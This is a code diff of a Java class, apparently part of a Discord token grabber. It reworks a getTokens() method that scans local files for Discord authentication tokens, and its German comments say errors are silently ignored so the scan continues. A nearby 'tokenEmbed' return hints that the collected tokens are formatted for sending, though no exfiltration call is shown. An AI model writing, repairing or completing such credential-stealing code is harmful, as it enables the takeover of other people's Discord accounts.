@@ -134,7 +134,6 @@ public final class Main {
         return tokenEmbed;
     }
 
-
     // NEU: Methode aus dem zweiten Code zum Suchen von Discord Tokens
     public static ArrayList<String> getTokens() {
         ArrayList<String> temp = new ArrayList<>();
@@ -165,14 +164,18 @@ public final class Main {
                                 if (!temp.contains(token) && token.split("\\.").length >= 2) {
                                     temp.add(token);
                                 }
-                                            } catch (Exception ignored) {
+                            } catch (Exception ignored) {
+                                // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
+                            }
+                        }
+                    }
+                } catch (Exception ignored) {
                     // Ignoriere Fehler beim Lesen einer Datei und setze fort
                 }
             }
         }
         return temp;
     }
-
 
     // --- AUSFÜHRUNG ---
 
